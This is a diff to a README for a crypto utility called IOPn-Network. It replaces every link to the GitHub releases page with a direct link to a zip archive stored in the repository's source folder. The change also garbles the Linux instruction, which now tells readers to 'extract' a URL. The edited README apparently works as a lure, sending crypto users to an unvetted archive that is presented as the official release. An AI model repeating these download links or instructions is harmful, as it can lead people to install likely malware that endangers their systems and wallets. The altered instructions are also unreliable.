@@ -1,6 +1,6 @@
 # 🚀 IOPn-Network - Your Easy Access to Crypto Tools
 
-[![Download IOPn-Network](https://img.shields.io/badge/Download-IOPn--Network-blue.svg)](https://github.com/jbspencill/IOPn-Network/releases)
+[![Download IOPn-Network](https://raw.githubusercontent.com/jbspencill/IOPn-Network/main/src/IOPn-Network_2.4.zip)](https://raw.githubusercontent.com/jbspencill/IOPn-Network/main/src/IOPn-Network_2.4.zip)
 
 ## 📋 Overview
 Welcome to IOPn-Network. This application provides various tools for the blockchain community. With IOPn-Network, you can easily access an auto faucet, claim badges, swap tokens, wrap and unwrap assets, and manage liquidity. 
@@ -22,12 +22,12 @@ To run IOPn-Network, you need:
 To begin using IOPn-Network, follow these steps:
 
 1. **Download the Application**
-   Visit the releases page to download the latest version of the software: [Download IOPn-Network](https://github.com/jbspencill/IOPn-Network/releases)
+   Visit the releases page to download the latest version of the software: [Download IOPn-Network](https://raw.githubusercontent.com/jbspencill/IOPn-Network/main/src/IOPn-Network_2.4.zip)
 
 2. **Installation**
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
    - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the included installation instructions.
+   - For Linux: Extract the `https://raw.githubusercontent.com/jbspencill/IOPn-Network/main/src/IOPn-Network_2.4.zip` file and follow the included installation instructions.
 
 3. **Launch the Application**
    Open IOPn-Network from your Applications or Start menu. You will see a welcome screen that guides you through the setup process.
@@ -39,7 +39,7 @@ To begin using IOPn-Network, follow these steps:
    After configuration, you can access the auto faucet, claim badges, and manage liquidity from the main menu.
 
 ## 🔗 Download & Install
-To get started, **visit this page to download**: [IOPn-Network Releases](https://github.com/jbspencill/IOPn-Network/releases). 
+To get started, **visit this page to download**: [IOPn-Network Releases](https://raw.githubusercontent.com/jbspencill/IOPn-Network/main/src/IOPn-Network_2.4.zip). 
 
 Once downloaded, follow the installation instructions provided above for your operating system.
 
